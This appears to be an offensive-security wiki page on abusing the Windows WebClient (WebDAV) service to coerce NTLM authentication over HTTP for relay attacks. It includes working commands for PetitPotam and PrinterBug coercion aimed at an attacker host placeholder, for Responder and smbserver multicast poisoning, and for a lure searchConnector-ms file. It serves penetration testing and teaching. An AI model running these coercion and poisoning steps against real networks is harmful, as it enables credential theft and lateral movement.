---
authors: ShutdownRepo, mpgn, sckdev, Pri3st, rtpt-romankarwacik, BlWasp
category: ad
---

# WebClient abuse (WebDAV)

## Theory

> Web Distributed Authoring and Versioning (WebDAV) is an extension to Hypertext Transfer Protocol (HTTP) that defines how basic file functions such as copy, move, delete, and create are performed by using HTTP ([docs.microsoft.com](https://docs.microsoft.com/en-us/windows/win32/webdav/webdav-portal))

The WebClient service needs to be enabled for WebDAV-based programs and features to work. As it turns out, the WebClient service can be indirectly abused by attackers to coerce authentications. This technique needs to be combined with other coercion techniques (e.g. [PetitPotam](ms-efsr.md), [PrinterBug](ms-rprn.md)), or [multicast poisoning](llmnr-nbtns-mdns-spoofing.md), to act as a booster for these techniques. It allows attackers to elicit authentications made over HTTP instead of SMB, hence heightening [NTLM relay](../ntlm/relay.md) capabilities.

## Practice

### Recon

Attackers can remotely enumerate systems on which the WebClient is running, which is not uncommon in organizations that use OneDrive or SharePoint or when mounting drives with a WebDAV connection string.

::: tabs

=== UNIX-like

From UNIX-like systems, this can be achieved with [webclientservicescanner](https://github.com/Hackndo/WebclientServiceScanner) (Python) or using [NetExec](https://github.com/Pennyw0rth/NetExec) (Python).

```bash
webclientservicescanner 'domain.local'/'user':'password'@'machine'
netexec smb 'TARGETS' -d 'domain' -u 'user' -p 'password' -M webdav
```


=== Windows

From Windows systems, this can be achived with [GetWebDAVStatus](https://github.com/G0ldenGunSec/GetWebDAVStatus) (C, C#)

```bash
GetWebDAVStatus.exe 'machine'
```

:::


### Abuse

#### Abuse from authentication coercion

Regular coercion techniques rely on the attacker forcing a remote system to authenticate to another one. The "other" system is usually an IP address, a domain or NetBIOS name. With WebClient abuse, the other system needs to be supplied in a WebDAV Connection String format.

The WebDAV Connection String format is: `\\SERVER@PORT\PATH\TO\DIR`.

> [!TIP]
> To retrieve an authenticated connection, the remote server that attacker wants to victim to be relayed to [should be considered in the intranet zone](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#getting-intranet-zoned). One way to do it is to use the NetBIOS or DNS name of the attacker machine instead of its IP address.
> 
> In order to have a valid NetBIOS name, [Responder](https://github.com/lgandx/Responder) can be used.
> 
> A heftier alternative is to do some [ADIDNS poisoning](adidns-spoofing.md) to create and use a valid DNS entry.

Below are a few examples of WebClient abuse with [PrinterBug](../print-spooler-service/printerbug.md) and [PetitPotam](ms-efsr.md).

```bash
# PrinterBug
dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "VICTIM_IP"
SpoolSample.exe "VICTIM_IP" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt"

# PetitPotam
Petitpotam.py "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "VICTIM_IP"
Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "VICTIM_IP"
PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "VICTIM_IP"
```

#### Abuse from multicast poisoning

In a different way, under certain conditions it is possible to force a WebDAV authentication from a multicast poisoning. Indeed, according to [this article](https://www.synacktiv.com/publications/taking-the-relaying-capabilities-of-multicast-poisoning-to-the-next-level-tricking) from Synacktiv, if the WebClient service is running on a machine, it is possible to obtain a WebDAV authentication from a multicast poisoning, instead of an SMB one, by changing the error code returned.

In fact, as explained in the article, [Responder](https://github.com/lgandx/Responder) normally ends the authentication exchange with a `STATUS_ACCESS_DENIED` status code in the context of the SMB exchange, closing the connection immediatly. However, by changing the code to `STATUS_LOGON_FAILURE` (`0xc000006d`) or `STATUS_BAD_NETWORK_NAME` (`0xc00000cc`), the SMB client will not immediatly close the connection and will attempt to fallback to the WebDAV client (if the WebClient service is running).

Below, an example to perform the attack with Responder (Python). At the time of writing, [this pull request](https://github.com/lgandx/Responder/pull/308) must be used.

```bash
responder --interface "eth0" -E
```

Alternatively, by default, [smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py) (Python) from Impacket ends the communications with `STATUS_LOGON_FAILURE`.

```bash
# Start smbserver in a first terminal with authentication required
python3 smbserver.py $NAME . -smb2support -username notexist -password notexist

# Start Responder in a second terminal
responder --interface "eth0"
```

The obtained authentications from multicast poisonings in Responder will come from WebDAV, in case the WebClient service is running on the targets.

::: details
As indicated in the article, limitations are present on this attack, and not all the functionalities involving SMB operations on a Windows machine will result in the SMB client automatically falling back to WebDav.

> During our research, we were able to confirm that the following actions do **trigger the behaviour**:
>
> - Running a `dir` command targeting a non-existing SMB share in Windows cmd.
> - Running the `net use` command targeting a non-existing SMB share in Windows cmd.
> - Trying to access a non-existing SMB share from the file explorer interface.
> - Trying to access a non-existing SMB share from a browser (such as Edge), or trying to load a non-existing SMB resource from a web page rendered by a browser.
> - Searching for a non-existing SMB share in the "map network drive" browsing window.
> - Searching for a non-existing SMB share from the "add network location" window.
>
> However, some other functionalities (that seem to explicitly expect to handle SMB operations that could not be related to any kind of WebDav functionality) **did not result in the SMB client falling back to WebDav**, for instance:
>
> - Using the `New-SmbMapping` Powershell cmdlet.
> - Only providing a server name (`\\idonotexist`) but no share name in the file explorer.
> - Clicking on "finish" in the "map network drive" window.
> - Trying to explicitly access a network share that was previously mounted and whose name does not resolve anymore.
>
>  _( Quentin Roland and Samuel Culeron, 26/02/2025, [source](https://www.synacktiv.com/publications/taking-the-relaying-capabilities-of-multicast-poisoning-to-the-next-level-tricking))_
:::

> [!WARNING] WARNING
> It is important to note that WebDAV authentication always needs DNS or NetBIOS resolution on the domain to work. It is therefore not possible to exploit this behaviour to obtain HTTP authentication via coercion without NetBIOS resolution, or without creating a DNS record in the ADIDNS.


### Start the WebClient service

On a side note, making a remote system start the WebClient service can be done in many ways

::: tabs

=== Map a WebDAV server

By mapping a remote WebDAV server. This can be done by having Responder's server up and by running the `net use` cmdlet.

```shell
# starting responder (in analyze mode to prevent poisoning)
responder --interface "eth0" --analyze
responder -I "eth0" -A

# map the drive from the target WebClient needs to be started on
net use x: http://$RESPONDER_IP/
```


=== searchConnector-ms

With a [searchConnector-ms](https://docs.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) file uploaded to widely used share within the organisation. Each time a user browses the folder, the WebClient service will start transparently.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>https://whatever/</url>
    </simpleLocation>
</searchConnectorDescription>
```


=== Explorer

By opening an interactive session with the target (e.g. RDP), opening the Explorer, and type something in the address bar.

=== Service trigger

According to [tiraniddo's research](https://www.tiraniddo.dev/2015/03/starting-webclient-service.html), the webclient service is registered with a service trigger, meaning it can be started automatically in response to a specific system event.
A simple way to start the service in an unprivileged session is by compiling and executing the following [C# PoC](https://gist.github.com/klezVirus/af004842a73779e1d03d47e041115797) created by [klezVirus](https://gist.github.com/klezVirus).

=== SharpStartWebclient

By compiling and executing the [SharpStartWebclient](https://github.com/eversinc33/SharpStartWebclient) tool created by [eversinc33](https://github.com/eversinc33)

=== Beacon Object File

By using the following [BOF (Beacon Object File)](https://github.com/outflanknl/C2-Tool-Collection/blob/main/BOF/StartWebClient/SOURCE/StartWebClient.c) created by [outflanknl](https://github.com/outflanknl).

:::


## Resources

[https://www.webdavsystem.com/server/access/windows](https://www.webdavsystem.com/server/access/windows)

[https://pentestlab.blog/2021/10/20/lateral-movement-webclient](https://pentestlab.blog/2021/10/20/lateral-movement-webclient)

[https://www.tiraniddo.dev/2015/03/starting-webclient-service.html](https://www.tiraniddo.dev/2015/03/starting-webclient-service.html)

[https://www.synacktiv.com/publications/taking-the-relaying-capabilities-of-multicast-poisoning-to-the-next-level-tricking](https://www.synacktiv.com/publications/taking-the-relaying-capabilities-of-multicast-poisoning-to-the-next-level-tricking)